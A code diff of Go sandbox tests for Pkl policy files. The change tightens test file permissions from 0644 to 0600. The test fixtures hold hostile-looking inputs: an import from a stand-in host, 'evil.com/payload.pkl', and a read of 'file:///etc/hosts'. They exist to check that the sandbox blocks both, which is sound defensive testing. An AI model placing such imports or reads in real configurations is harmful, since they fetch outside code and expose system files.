@@ -16,7 +16,7 @@ func TestPklSandboxBlocksExternalHTTP(t *testing.T) {
 	tmpDir := t.TempDir()
 	policyPath := filepath.Join(tmpDir, "evil_http.pkl")
 	content := []byte(`import "https://evil.com/payload.pkl"`)
-	if err := os.WriteFile(policyPath, content, 0644); err != nil {
+	if err := os.WriteFile(policyPath, content, 0600); err != nil {
 		t.Fatalf("failed to write mock policy: %v", err)
 	}
 
@@ -40,7 +40,7 @@ func TestPklSandboxBlocksFileEscape(t *testing.T) {
 	content := []byte(`
 text = read("file:///etc/hosts").text
 `)
-	if err := os.WriteFile(policyPath, content, 0644); err != nil {
+	if err := os.WriteFile(policyPath, content, 0600); err != nil {
 		t.Fatalf("failed to write mock policy: %v", err)
 	}
 
